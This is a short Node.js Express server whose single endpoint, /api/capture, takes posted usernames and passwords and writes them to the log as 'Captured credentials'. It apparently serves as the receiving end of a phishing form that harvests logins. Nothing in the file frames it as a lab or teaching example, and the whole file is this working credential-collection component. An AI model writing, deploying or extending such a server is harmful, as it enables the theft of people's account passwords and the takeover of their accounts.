const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));

app.post('/api/capture', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    console.log(`Captured credentials: Username - ${username}, Password - ${password}`);
    res.sendStatus(200);
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
